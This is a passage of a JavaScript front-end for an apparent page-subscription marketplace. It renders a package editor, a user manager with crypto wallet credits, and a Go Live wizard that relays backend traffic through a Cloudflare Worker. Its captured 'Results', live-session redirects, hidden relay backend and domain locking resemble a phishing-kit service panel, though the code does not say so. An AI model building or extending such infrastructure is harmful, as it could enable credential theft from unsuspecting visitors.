      </div>
    </section>
  `;

  statusText.textContent = `${sourceLabel.toUpperCase()} IMPORT WIZARD READY`;
  topbarTitle.textContent = "Import Wizard";
}

function renderAdminPackageEditor(packageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getAdminPackage(packageSlug);
  if (!page) {
    preview.innerHTML = `
      <section class="app-view">
        <div class="view-heading">
          <small>package editor</small>
          <h2>No package loaded</h2>
          <p>Create or import a package first. The editor now only opens real package records from the API.</p>
        </div>
        ${viewNav([routeButton("#admin", "Back to admin", "primary"), routeButton("#admin-import-github", "Import GitHub")])}
        ${emptyState("No package record", "Publish a package from the admin studio to edit its screens, CSS, pricing, and release settings.", "#admin")}
      </section>
    `;
    statusText.textContent = "PACKAGE RECORD REQUIRED";
    topbarTitle.textContent = "Package Editor";
    return;
  }

  const thumbnailUrl = packageThumbnailUrl(page);
  const thumbnailLabel = page.thumbnailDataUrl ? "Manual thumbnail active" : page.thumbnailPath ? page.thumbnailPath : "No thumbnail override";

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>package editor</small>
        <h2>${page.name}</h2>
        <p>Edit package details, map imported files, tune CSS/design tokens, and prepare the next publishable version.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#pages", "Marketplace"),
        routeButton("#my-pages", "My Pages")
      ])}

      <article class="admin-package-card">
        <div>
          <small>${page.status}</small>
          <h3>${page.name} ${page.version}</h3>
          <p>${page.source} / ${page.cssMode} / ${page.repo}</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-admin-action="${page.name.toUpperCase()} DRAFT SAVED">Save draft</button>
          <button type="button" data-admin-action="${page.name.toUpperCase()} PREVIEW GENERATED">Preview</button>
          <button type="button" data-admin-action="${page.name.toUpperCase()} VERSION PUBLISHED">Publish</button>
        </div>
      </article>

      <div class="package-editor-grid">
        <article class="security-panel package-form">
          <small>package details</small>
          <h3>Listing settings</h3>
          <label><span>Package ID</span><input type="text" value="${page.id}"></label>
          <label><span>Package name</span><input type="text" value="${page.name}"></label>
          <label><span>Package type</span><input type="text" value="${page.type}"></label>
          <label><span>Weekly price</span><input type="text" value="${page.price}"></label>
          <label><span>Version</span><input type="text" value="${page.version}"></label>
          <label><span>Source type</span><input type="text" value="${page.sourceType}"></label>
          <label><span>Source path</span><input type="text" value="${page.repo}"></label>
          <label><span>Status</span><select><option>${page.status}</option><option>Draft</option><option>Review</option><option>Published</option></select></label>
        </article>

        <article class="security-panel package-form thumbnail-uploader">
          <small>thumbnail</small>
          <h3>Marketplace image</h3>
          <div class="thumbnail-preview">
            ${thumbnailUrl ? `<img src="${escapeHtml(thumbnailUrl)}" alt="${escapeHtml(page.name)} thumbnail">` : `<span>${escapeHtml(pageInitials(page.name))}</span>`}
          </div>
          <label>
            <span>Upload thumbnail</span>
            <input type="file" accept="image/png,image/jpeg,image/webp,image/svg+xml" data-package-thumbnail="${escapeHtml(page.slug)}">
          </label>
          <code>${escapeHtml(thumbnailLabel)}</code>
        </article>

        <article class="security-panel package-form">
          <small>billing periods</small>
          <h3>Subscription prices</h3>
          <label><span>Daily</span><input type="text" value="$${page.billingPeriods.daily}"></label>
          <label><span>Weekly</span><input type="text" value="$${page.billingPeriods.weekly}"></label>
          <label><span>Biweekly</span><input type="text" value="$${page.billingPeriods.biweekly}"></label>
          <label><span>Monthly</span><input type="text" value="$${page.billingPeriods.monthly}"></label>
        </article>

        <article class="security-panel package-form">
          <small>design tokens</small>
          <h3>CSS controls</h3>
          <label><span>Brand color</span><input type="text" value="${page.tokens.brand}"></label>
          <label><span>Font family</span><input type="text" value="${page.tokens.font}"></label>
          <label><span>Border radius</span><input type="text" value="${page.tokens.radius}"></label>
          <label><span>Custom CSS override</span><textarea>.package-${page.slug} .button { background: var(--brand); }</textarea></label>
        </article>

        <article class="security-panel">
          <small>file mapping</small>
          <h3>Imported screens</h3>
          <div class="file-map-list">
            ${page.screens.map((screen, index) => `
              <div>
                <strong>${String(index + 1).padStart(2, "0")}</strong>
                <span>${screen}</span>
                <em>${index === 0 ? "Entry" : index === page.screens.length - 1 ? "Final" : "Screen"}</em>
                <button type="button" data-admin-action="${screen.toUpperCase()} MAPPING EDITED">Map</button>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>assets and css files</small>
          <h3>Source inventory</h3>
          <div class="feature-row">
            ${page.assets.map((asset) => `<span>${asset}</span>`).join("")}
            ${page.cssFiles.map((cssFile) => `<span>${cssFile}</span>`).join("")}
            <span>${page.inlineCssBlocks} inline CSS blocks</span>
          </div>
        </article>

        <article class="security-panel">
          <small>css inspection</small>
          <h3>Normalization status</h3>
          <div class="pipeline-steps">
            <span class="done">HTML parsed</span>
            <span class="done">${page.cssMode}</span>
            <span class="${page.design === "Needs review" ? "active" : "done"}">${page.design}</span>
            <span>Preview required</span>
            <span>Publish ready</span>
          </div>
        </article>

        <article class="security-panel">
          <small>version history</small>
          <h3>Release controls</h3>
          <div class="traffic-log">
            <div><span>${page.version}</span><strong>Current</strong><em>${page.status}</em><small>Latest working version for this package.</small></div>
            <div><span>new</span><strong>Updated</strong><em>${page.updatedAt.slice(0, 10)}</em><small>Last package metadata update.</small></div>
            <div><span>old</span><strong>Created</strong><em>${page.createdAt.slice(0, 10)}</em><small>Original package import date.</small></div>
            <div><span>prev</span><strong>Rollback</strong><em>Ready</em><small>Keep the previous package build available for recovery.</small></div>
            <div><span>next</span><strong>Draft</strong><em>Queued</em><small>Save edits as the next version before publishing.</small></div>
          </div>
        </article>

        <article class="security-panel package-preview-card">
          <small>preview</small>
          <h3>Design match preview</h3>
          <div style="--package-accent: ${page.tokens.brand}" class="mini-page-preview">
            <span>${page.name}</span>
            <strong>${page.cssMode}</strong>
            <button type="button">Sample CTA</button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} PACKAGE EDITOR OPEN`;
  topbarTitle.textContent = `${page.name} Editor`;
}

function renderAdminUsers() {
  activeFlowSlug = null;
  const activeCount = adminUsers.filter((user) => String(user.status).toLowerCase() === "active").length;
  const reviewCount = adminUsers.filter((user) => String(user.status).toLowerCase() === "review").length;
  const activeFunding = adminDepositRequests.filter((request) => ["pending", "reviewing"].includes(request.status));
  const reviewedFunding = adminDepositRequests.filter((request) => ["approved", "rejected"].includes(request.status)).slice(0, 5);
  const totalWallet = adminUsers.reduce((sum, user) => sum + Number(user.walletBalance || 0), 0);
  const totalPages = adminUsers.reduce((sum, user) => sum + (user.pages?.length || 0), 0);

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin user manager</small>
        <h2>Users and access</h2>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#wallet", "Wallet"),
        routeButton("#my-pages", "My Pages")
      ])}

      <div class="summary-grid">
        <article><small>Total users</small><b>${String(adminUsers.length).padStart(2, "0")}</b><span>User accounts</span></article>
        <article><small>Active</small><b>${String(activeCount).padStart(2, "0")}</b><span>Allowed access</span></article>
        <article><small>Wallet total</small><b>${formatMoney(totalWallet)}</b><span>All balances</span></article>
        <article><small>Pages</small><b>${String(totalPages).padStart(2, "0")}</b><span>${reviewCount} under review</span></article>
      </div>

      <article class="admin-package-card">
        <div>
          <small>operator controls</small>
          <h3>Manage users, wallet, pages, and privileges</h3>
          <p>Select a user page to extend days, reactivate expired access, enable admin-free subscription, or change auto-renew.</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-refresh-admin-users>Refresh users</button>
          <button type="button" data-admin-action="USER EXPORT QUEUED">Export users</button>
        </div>
      </article>

      <article class="admin-table-card">
        <div class="builder-heading">
          <div>
            <small>crypto funding</small>
            <h3>Pending wallet credits</h3>
          </div>
          <button type="button" data-admin-action="FUNDING QUEUE REFRESHED">Refresh</button>
        </div>
        <div class="fund-request-list">
          ${activeFunding.length ? activeFunding.map((request) => `
            <article>
              <div>
                <strong>${escapeHtml(request.userEmail || request.userName || request.userId)}</strong>
                <span>${escapeHtml(request.cryptoType)} / ${escapeHtml(request.network)} - ${formatMoney(request.amount)}</span>
                ${walletFundingQuoteSummary(request) ? `<em>${escapeHtml(walletFundingQuoteSummary(request))}</em>` : ""}
                <code>${escapeHtml(request.txHash)}</code>
                <small class="fund-status fund-status-${escapeHtml(request.status)}">${escapeHtml(request.status)}</small>
                <textarea data-fund-admin-note="${escapeHtml(request.id)}" placeholder="Admin note">${escapeHtml(request.adminNote || "")}</textarea>
              </div>
              <div class="fund-review-actions">
                <button type="button" data-review-wallet-fund="${escapeHtml(request.id)}">Reviewing</button>
                <button type="button" data-approve-wallet-fund="${escapeHtml(request.id)}">Approve</button>
                <button type="button" data-reject-wallet-fund="${escapeHtml(request.id)}">Reject</button>
              </div>
            </article>
          `).join("") : `
            <article>
              <div>
                <strong>No pending funding</strong>
                <span>Submitted crypto payments will appear here.</span>
              </div>
            </article>
          `}
        </div>
        ${reviewedFunding.length ? `
          <div class="fund-history-list">
            ${reviewedFunding.map((request) => `
              <div>
                <span>${escapeHtml(request.userEmail || request.userName || request.userId)}</span>
                <b>${formatMoney(request.amount)}</b>
                <small class="fund-status fund-status-${escapeHtml(request.status)}">${escapeHtml(request.status)}</small>
              </div>
            `).join("")}
          </div>
        ` : ""}
      </article>

      <article class="admin-table-card">
        <div class="builder-heading">
          <div>
            <small>user directory</small>
            <h3>Accounts</h3>
          </div>
          <button type="button" data-admin-action="USER DIRECTORY REFRESHED">Refresh</button>
        </div>
        <div class="user-manager-list">
          ${adminUsers.length ? adminUsers.map((user) => {
            const initials = user.name.split(" ").map((part) => part[0]).join("").slice(0, 2).toUpperCase() || "US";
            const selectedPage = user.pages?.[0] || null;
            const isExpanded = expandedAdminUsers.has(user.id);
            const collabsOpen = collabAdminUsers.has(user.id);
            const collab = user.collaboration || {};
            const recentSpendRows = (user.recentTransactions || []).slice(0, 3);
            return `
            <article class="admin-user-card">
              <div class="user-avatar">${escapeHtml(initials)}</div>
              <div class="user-copy">
                <strong>${escapeHtml(user.name)}</strong>
                <span>${escapeHtml(user.email)}</span>
              </div>
              <div class="user-tags">
                <span>${escapeHtml(user.role)}</span>
                <span>${escapeHtml(user.status)}</span>
                <span>${formatMoney(user.walletBalance)}</span>
                <span>Spent ${formatMoney(user.spend?.totalSpent || 0)}</span>
                <span>${user.pages.length} pages</span>
                ${collab.enabled ? "<span>Collab on</span>" : ""}
              </div>
              <div class="user-actions admin-user-actions">
                <button type="button" data-admin-user-expand="${escapeHtml(user.id)}">${isExpanded ? "Collapse" : "Expand"}</button>
                <button type="button" data-admin-user-collabs="${escapeHtml(user.id)}">${collabsOpen ? "Hide collabs" : "Collabs"}</button>
              </div>

              ${isExpanded ? `
              <div class="admin-user-controls">
                <label>
                  <span>Role</span>
                  <select data-admin-user-field="role" data-admin-user="${escapeHtml(user.id)}">
                    ${["subscriber", "support", "admin"].map((role) => `<option value="${role}" ${String(user.role).toLowerCase() === role ? "selected" : ""}>${role}</option>`).join("")}
                  </select>
                </label>
                <label>
                  <span>Status</span>
                  <select data-admin-user-field="status" data-admin-user="${escapeHtml(user.id)}">
                    ${["active", "review", "suspended"].map((status) => `<option value="${status}" ${String(user.status).toLowerCase() === status ? "selected" : ""}>${status}</option>`).join("")}
                  </select>
                </label>
                <button type="button" data-save-admin-user="${escapeHtml(user.id)}">Save access</button>
              </div>

              <div class="admin-user-controls admin-spend-control">
                <div>
                  <span>Total spent</span>
                  <strong>${formatMoney(user.spend?.totalSpent || 0)}</strong>
                </div>
                <div>
                  <span>Subscriptions</span>
                  <strong>${formatMoney(user.spend?.subscriptionSpend || 0)}</strong>
                </div>
                <div>
                  <span>Total funded</span>
                  <strong>${formatMoney(user.spend?.totalFunded || 0)}</strong>
                </div>
                <div>
                  <span>Crypto funded</span>
                  <strong>${formatMoney(user.spend?.cryptoFunded || 0)}</strong>
                </div>
                ${recentSpendRows.length ? `
                  <section class="admin-recent-spend">
                    ${recentSpendRows.map((transaction) => `
                      <div>
                        <span>${escapeHtml(transaction.type || "transaction")}</span>
                        <b class="${Number(transaction.amount || 0) < 0 ? "is-negative" : "is-positive"}">${formatMoney(transaction.amount || 0)}</b>
                        <small>${escapeHtml(walletHistoryDate(transaction.createdAt))}</small>
                      </div>
                    `).join("")}
                  </section>
                ` : ""}
              </div>

              <div class="admin-user-controls wallet-control">
                <label><span>Wallet amount</span><input type="number" step="0.01" data-admin-wallet-amount="${escapeHtml(user.id)}" placeholder="100"></label>
                <label><span>Note</span><input type="text" data-admin-wallet-note="${escapeHtml(user.id)}" placeholder="Manual credit / correction"></label>
                <button type="button" data-admin-wallet-credit="${escapeHtml(user.id)}">Credit</button>
                <button type="button" data-admin-wallet-debit="${escapeHtml(user.id)}">Debit</button>
              </div>

              <div class="admin-user-controls page-control">
                <label>
                  <span>User page</span>
                  <select data-admin-page-select="${escapeHtml(user.id)}">
                    ${user.pages.length ? user.pages.map((page) => `<option value="${escapeHtml(page.id)}">${escapeHtml(page.name)} / ${escapeHtml(page.subscription?.renewalDate || "no renewal")}</option>`).join("") : '<option value="">No pages</option>'}
                  </select>
                </label>
                <label><span>Extend days</span><input type="number" min="1" max="365" data-admin-page-days="${escapeHtml(user.id)}" value="7"></label>
                <label class="toggle-row"><input type="checkbox" data-admin-page-free="${escapeHtml(user.id)}" ${selectedPage?.subscription?.adminFreeSubscription ? "checked" : ""}><span>Admin free</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-page-autorenew="${escapeHtml(user.id)}" ${selectedPage?.subscription?.autoRenew ? "checked" : ""}><span>Auto renew</span></label>
                <button type="button" data-admin-page-extend="${escapeHtml(user.id)}">Extend / Reactivate</button>
              </div>
              ` : ""}

              ${collabsOpen ? `
              <div class="admin-user-controls collab-control">
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="enabled" data-admin-collab="${escapeHtml(user.id)}" ${collab.enabled ? "checked" : ""}><span>Enable collab access</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="pageEditor" data-admin-collab="${escapeHtml(user.id)}" ${collab.pageEditor ? "checked" : ""}><span>Page editor</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="supportAccess" data-admin-collab="${escapeHtml(user.id)}" ${collab.supportAccess ? "checked" : ""}><span>Support access</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="walletReview" data-admin-collab="${escapeHtml(user.id)}" ${collab.walletReview ? "checked" : ""}><span>Wallet review</span></label>
                <label><span>Collab note</span><input type="text" data-admin-collab-note="${escapeHtml(user.id)}" value="${escapeHtml(collab.note || "")}" placeholder="Scope, team, or restriction"></label>
                <button type="button" data-save-admin-user="${escapeHtml(user.id)}">Save collabs</button>
              </div>
              ` : ""}
            </article>
          `;
          }).join("") : emptyState("No users loaded", "Refresh users or check admin API access.", "#admin-users")}
        </div>
      </article>

      <div class="admin-grid">
        <article class="security-panel">
          <small>role options</small>
          <h3>Access levels</h3>
          <div class="admin-rule-list">
            <div><strong>01</strong><span>Subscriber: can subscribe, configure owned pages, download index.html.</span></div>
            <div><strong>02</strong><span>Support: can view users and help with domains/security but cannot publish packages.</span></div>
            <div><strong>03</strong><span>Admin: can manage packages, users, wallet corrections, and publishing.</span></div>
          </div>
        </article>

        <article class="security-panel">
          <small>security options</small>
          <h3>User safety controls</h3>
          <div class="feature-row">
            <span>Suspend account</span>
            <span>Ban IP</span>
            <span>Whitelist IP</span>
            <span>Reset login</span>
            <span>Pause renewals</span>
            <span>Force CAPTCHA</span>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = "ADMIN USER MANAGER READY";
  topbarTitle.textContent = "User Manager";
}

function pageTrafficCount(page) {
  const logCount = page.securityConfig?.trafficLog?.length;
  if (Number.isFinite(logCount) && logCount > 0) return logCount;
  const numericTraffic = String(page.traffic || "").match(/\d+/);
  return numericTraffic ? Number(numericTraffic[0]) : 0;
}

function pageLaunchReadiness(page) {
  const checks = [
    Boolean(page.subscription?.billingPeriod),
    Boolean(page.hostingConfig?.domain || page.domain),
    Boolean(page.hostingConfig?.serverIp),
    Boolean(page.generatedFile?.lastGeneratedAt || page.generatedFile?.version)
  ];
  const passed = checks.filter(Boolean).length;
  return {
    passed,
    total: checks.length,
    percent: Math.round((passed / checks.length) * 100)
  };
}

function pageRiskSignal(page) {
  const routeKey = pageRouteKey(page);
  const hosting = page.hostingConfig || {};
  const security = page.securityConfig || {};
  const generated = page.generatedFile || {};
  const renewal = subscriptionState(page);
  const domain = hosting.domain || page.domain || "";
  const serverIp = hosting.serverIp || hosting.origin || hosting.relayTarget || "";
  const connectionType = hosting.connectionType || "cloudflare-worker";
  const workerReady = connectionType !== "cloudflare-worker" || Boolean(hosting.cloudflare?.routePattern || hosting.workerRoute || hosting.relayVerified);
  const generatedReady = Boolean(generated.lastGeneratedAt || generated.version);
  const allowedDomains = (security.domains || []).map(normalizeAllowedHost).filter(Boolean);
  const domainAllowed = !domain || !allowedDomains.length || allowedDomains.includes(normalizeAllowedHost(domain));
  const issues = [];

  if (renewal.expired || renewal.paymentFailed) {
    issues.push({
      severity: "red",
      layer: "Subscription",
      code: renewal.paymentFailed ? "PAYMENT_FAILED" : "SUBSCRIPTION_EXPIRED",
      detail: "Runtime access can stop until the page is renewed.",
      fix: "#wallet",
      action: "Fund wallet"
    });
  }

  if (!domain) {
    issues.push({
      severity: "red",
      layer: "Domain",
      code: "DOMAIN_MISSING",
      detail: "No live domain is connected to this page.",
      fix: `#config-${routeKey}`,
      action: "Set domain"
    });
  } else if (!domainAllowed) {
    issues.push({
      severity: "red",
      layer: "Security",
      code: "DOMAIN_NOT_ALLOWED",
      detail: "Saved security domains do not include the live domain.",
      fix: `#security-${routeKey}`,
      action: "Fix allowlist"
    });
  }

  if (!serverIp) {
    issues.push({
      severity: "yellow",
      layer: "Host",
      code: "HOST_ORIGIN_MISSING",
      detail: "No host/origin target is saved for live relay checks.",
      fix: `#go-live-${routeKey}`,
      action: "Open Go Live"
    });
  }

  if (!workerReady) {
    issues.push({
      severity: "yellow",
      layer: "Cloudflare",
      code: "WORKER_NOT_VERIFIED",
      detail: "Worker route or relay verification is not complete.",
      fix: `#go-live-${routeKey}`,
      action: "Verify route"
    });
  }

  if (!generatedReady) {
    issues.push({
      severity: "yellow",
      layer: "Runtime",
      code: "INDEX_NOT_GENERATED",
      detail: "Runtime index has not been generated after setup.",
      fix: `#go-live-${routeKey}`,
      action: "Generate"
    });
  }

  if (hosting.liveStatus && /flag|red|blocked|suspend|down|fail|error/i.test(hosting.liveStatus)) {
    issues.push({
      severity: "red",
      layer: "Live status",
      code: "LIVE_STATUS_RED",
      detail: hosting.liveStatus,
      fix: `#go-live-${routeKey}`,
      action: "Inspect"
    });
  }

  const topIssue = issues.find((issue) => issue.severity === "red") || issues[0] || null;
  const status = topIssue?.severity || "green";
  return {
    status,
    label: status === "red" ? "Red" : status === "yellow" ? "Watch" : "Green",
    layer: topIssue?.layer || "Live",
    code: topIssue?.code || "LIVE_READY",
    detail: topIssue?.detail || "No operational issues detected from saved app data.",
    action: topIssue?.action || "Open",
    fix: topIssue?.fix || `#go-live-${routeKey}`,
    issues
  };
}

function ownedPageCard(page, index) {
  const routeKey = pageRouteKey(page);
  const readiness = pageLaunchReadiness(page);
  const risk = pageRiskSignal(page);
  const hosting = page.hostingConfig || {};
  const liveStatus = hosting.liveStatus || (hosting.verified ? "Live" : hosting.serverIp ? "Ready to verify" : "Setup needed");
  const domain = hosting.domain || page.domain || "No domain connected";
  const billing = page.subscription?.billingPeriod
    ? `${billingLabel(page.subscription.billingPeriod)} / ${formatMoney(page.subscription.renewalPrice || 0)}`
    : "Billing not set";
  const renewal = subscriptionState(page);
  const securityLabel = page.securityConfig?.captcha ? "Captcha on" : "Captcha off";
  const trafficCount = pageTrafficCount(page);
  const resultCount = page.results?.length || 0;
  const generatedLabel = page.generatedFile?.lastGeneratedAt ? "Generated" : page.generatedFile?.version || "Not generated";
  const renewButtonLabel = renewal.paymentFailed ? "Fund and renew" : renewal.expired ? "Restore page" : "Renew now";

  return `
    <article class="owned-page-card my-page-card">
      <header class="my-page-head">
        <div class="owned-main">
          <small>${escapeHtml(page.status || "active")}</small>
          <h3>${escapeHtml(page.name)}</h3>
          <p>${escapeHtml(domain)}</p>
          <span class="subscription-chip ${renewal.className}">${escapeHtml(renewal.label)}</span>
          <span class="risk-chip is-${risk.status}">${escapeHtml(risk.label)} / ${escapeHtml(risk.layer)}</span>
        </div>
        <div class="my-page-score" aria-label="${readiness.percent}% launch ready">
          <strong>${readiness.percent}%</strong>
          <span>${readiness.passed}/${readiness.total} ready</span>
        </div>
      </header>

      <div class="my-page-status-grid">
        <div class="risk-status is-${risk.status}"><span>Risk</span><strong>${escapeHtml(risk.code)}</strong></div>
        <div><span>Launch</span><strong>${escapeHtml(liveStatus)}</strong></div>
        <div><span>Plan</span><strong>${escapeHtml(billing)}</strong></div>
        <div><span>Renewal</span><strong>${escapeHtml(renewal.dueLabel)}</strong></div>
        <div><span>Results</span><strong>${resultCount}</strong></div>
        <div><span>Traffic</span><strong>${trafficCount}</strong></div>
      </div>

      <details class="my-page-tools" ${index === 0 ? "open" : ""}>
        <summary>
          <span>Manage page</span>
          <strong>${escapeHtml(renewal.dueLabel)} / ${escapeHtml(securityLabel)} / ${escapeHtml(generatedLabel)}</strong>
        </summary>
        <div class="my-page-tool-grid" aria-label="${escapeHtml(page.name)} management tools">
          <section>
            <h4>Page controls</h4>
            <button type="button" data-go-live="${escapeHtml(routeKey)}">&#128640; Go Live</button>
            <button type="button" data-config-page="${escapeHtml(routeKey)}">&#9881; Config</button>
            <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="security">&#128737; Security</button>
            <button type="button" data-results="${escapeHtml(routeKey)}">&#128193; Results</button>
            <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="traffic">&#128200; Traffic</button>
            <button type="button" data-page-log="${escapeHtml(routeKey)}">&#128220; Log</button>
            <button type="button" data-renew-page="${escapeHtml(routeKey)}" ${renewal.canRenew ? "" : "disabled"}>&#8635; ${escapeHtml(renewButtonLabel)}</button>
          </section>
        </div>
      </details>
    </article>
  `;
}

function renderMyPages() {
  activeFlowSlug = null;
  const liveCount = ownedPages.filter((page) => page.hostingConfig?.verified || page.hostingConfig?.liveStatus === "Live").length;
  const resultTotal = ownedPages.reduce((sum, page) => sum + (page.results?.length || 0), 0);
  const captchaCount = ownedPages.filter((page) => page.securityConfig?.captcha).length;
  const subscriptionStates = ownedPages.map((page) => ({ page, state: subscriptionState(page) }));
  const expiredCount = subscriptionStates.filter((item) => item.state.expired).length;
  const dueSoonCount = subscriptionStates.filter((item) => item.state.dueSoon && !item.state.expired).length;

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>my pages</small>
        <h2>Page control room</h2>
      </div>
      ${viewNav([
        routeButton("#dashboard", "&#8592; Dashboard"),
        routeButton("#pages", "Browse pages")
      ])}

      <div class="summary-grid my-pages-kpis">
        <article><small>Owned pages</small><b>${String(ownedPages.length).padStart(2, "0")}</b><span>Active subscriptions</span></article>
        <article><small>Live pages</small><b>${String(liveCount).padStart(2, "0")}</b><span>Verified hosting</span></article>
        <article><small>Results</small><b>${String(resultTotal).padStart(2, "0")}</b><span>Saved submissions</span></article>
        <article><small>Renewals</small><b>${String(expiredCount).padStart(2, "0")}</b><span>${dueSoonCount} due soon</span></article>
      </div>

      <article class="my-pages-brief">
        <div class="feature-row">
          <span>${captchaCount} captcha enabled</span>
          <span>${ownedPages.filter((page) => page.subscription?.autoRenew).length} auto-renewing</span>
          <span>${expiredCount} locked</span>
          <span>${ownedPages.filter((page) => page.generatedFile?.lastGeneratedAt).length} generated files</span>
        </div>
      </article>

      <div class="owned-list">
        ${ownedPages.length ? ownedPages.map(ownedPageCard).join("") : emptyState("No subscribed pages yet", "Subscribe to a published page package, then your live page controls will appear here.", "#pages")}
      </div>
    </section>
  `;
  statusText.textContent = "MY PAGES MANAGEMENT ACTIVE";
  topbarTitle.textContent = "My Pages";
}

function renderGoLiveCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const hosting = page.hostingConfig || {};
  const verifiedLabel = hosting.verified ? "Verified" : "Not verified";
  const liveStatus = hosting.liveStatus || "Setup required";
  const domain = hosting.domain || page.domain || "";
  const serverIp = hosting.serverIp || "";
  const hostingType = hosting.hostingType || "render-static-site";
  const isRenderStatic = hostingType === "render-static-site";
  const installPath = hosting.installPath || (isRenderStatic ? "root / public directory" : "public_html");
  const connectionType = hosting.connectionType || "cloudflare-worker";
  const relaySecret = hosting.relaySecret || "";
  const relayTarget = hosting.relayTarget || apiBase();
  const cloudflare = hosting.cloudflare || {};
  const managedInstalled = Boolean(cloudflare.managed && cloudflare.routePattern);
  const workerRoute = domain ? `${domain}/api/*` : "clientdomain.com/api/*";
  const hasDomain = Boolean(domain);
  const hasRenderOrigin = Boolean(serverIp);
  const hasRelayTarget = Boolean(relayTarget);
  const hasRelaySecret = Boolean(relaySecret);
  const hasWorkerRoute = managedInstalled || (hasDomain && hasRelaySecret);
  const hasVerified = Boolean(hosting.verified || hosting.relayVerified);
  const readyToDownload = hasDomain && hasRelaySecret && hasRelayTarget;
  const displayDomain = domain || "clientdomain.com";
  const pagePackage = packageForUserPage(page);
  const runtimeEntryFile = packageEntryFile(pagePackage);
  const runtimeTargets = sessionPageTargets(page);
  const runtimeSourceReady = shouldUsePackageRuntime(page, pagePackage)
    ? Boolean(runtimeEntryFile)
    : Boolean((page.flow || []).length || runtimeEntryFile);
  const resultsEndpointReady = Boolean(page.id && hasRelayTarget);
  const goLiveChecks = [
    {
      label: "Live domain",
      done: hasDomain,
      detail: hasDomain ? `${displayDomain} is the only allowed hostname.` : "Set the user's live domain in Config."
    },
    {
      label: "Raw host URL",
      done: hasRenderOrigin,
      detail: hasRenderOrigin ? "Origin host is saved for the uploaded index.html." : "Save the static host URL where index.html will live."
    },
    {
      label: "Relay secret",
      done: hasRelaySecret,
      detail: hasRelaySecret ? "Runtime API calls can be relayed privately." : "Generate the relay secret before Worker install."
    },
    {
      label: "Worker route",
      done: hasWorkerRoute,
      detail: hasWorkerRoute ? `${workerRoute} is ready or derivable from the saved domain.` : "Install or verify the Cloudflare Worker route."
    },
    {
      label: "Runtime pages",
      done: runtimeSourceReady,
      detail: runtimeSourceReady ? `Entry page ${runtimeEntryFile || "configured flow"} is available.` : "Import must include an entry HTML file or configured flow."
    },
    {
      label: "Session redirects",
      done: runtimeTargets.length > 0,
      detail: runtimeTargets.length ? `${runtimeTargets.length} page target${runtimeTargets.length === 1 ? "" : "s"} mapped for live sessions.` : "Map HTML pages so active sessions can be redirected."
    },
    {
      label: "Results endpoint",
      done: resultsEndpointReady,
      detail: resultsEndpointReady ? "Submissions and page events can sync to this user page." : "Runtime API target is not ready yet."
    },
    {
      label: "Download ready",
      done: readyToDownload && runtimeSourceReady,
      detail: readyToDownload && runtimeSourceReady ? "Download one launcher index.html for the host root." : "Complete domain, relay, and runtime checks first."
    }
  ];
  const workerScript = cloudflareWorkerScript({
    ...page,
    hostingConfig: { ...hosting, domain, relaySecret, relayTarget, connectionType }
  });

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>go live setup</small>
        <h2>${page.name} activation</h2>
        <p>Follow the steps in order. The page is strict live-domain only: it loads on ${displayDomain}, while backend traffic stays behind a domain relay.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#config-${routeKey}`, "Config")
      ])}

      <div class="summary-grid go-live-summary">
        <article><small>Live status</small><b>${liveStatus}</b><span>${verifiedLabel}</span></article>
        <article><small>Domain</small><b>${domain || "Unset"}</b><span>Allowed host</span></article>
        <article><small>Hosting</small><b>${hostingTypeLabel(hostingType)}</b><span>${hosting.relayVerified ? "Verified" : "Needs check"}</span></article>
        <article><small>Route</small><b>${workerRoute}</b><span>Worker path</span></article>
      </div>

      <div class="wizard-progress go-live-progress">
        <span class="${setupStepClass(hasDomain, true)}">1 Domain</span>
        <span class="${setupStepClass(hasRenderOrigin, hasDomain && !hasRenderOrigin)}">2 Host</span>
        <span class="${setupStepClass(hasRelaySecret, hasDomain && !hasRelaySecret)}">3 Secret</span>
        <span class="${setupStepClass(hasWorkerRoute, hasRelaySecret && !hasWorkerRoute)}">4 Worker</span>
        <span class="${setupStepClass(hasVerified, hasWorkerRoute && !hasVerified)}">5 Verify</span>
        <span class="${setupStepClass(page.generatedFile?.lastGeneratedAt, readyToDownload)}">6 Download</span>
      </div>

      ${goLiveChecklistMarkup(goLiveChecks)}

      <div class="go-live-steps">
        <article class="security-panel package-form go-live-step-card ${hasDomain ? "is-complete" : "is-active"}">
          <small>step 1</small>
          <h3>Confirm the live domain</h3>
          <p>The domain is managed in Config. Go Live uses that saved domain as the only hostname where the downloaded page is allowed to run.</p>
          <div class="admin-code-sample">
            <code>Live domain: ${escapeHtml(domain || "Not configured")}</code>
            <code>Allowed URL: https://${escapeHtml(displayDomain)}/</code>
          </div>
          <label>
            <span>Connection type</span>
            <select data-hosting-field="connectionType">
              ${[
                ["cloudflare-worker", "Cloudflare Worker Relay"],
                ["direct-api", "Direct API"],
                ["server-proxy", "Server proxy"]
              ].map(([value, label]) => `<option value="${value}" ${connectionType === value ? "selected" : ""}>${label}</option>`).join("")}
            </select>
          </label>
          <div class="admin-actions">
            <button type="button" data-route="#config-${routeKey}">Open Config</button>
            <button type="button" data-save-hosting="${routeKey}">Save connection type</button>
          </div>
        </article>

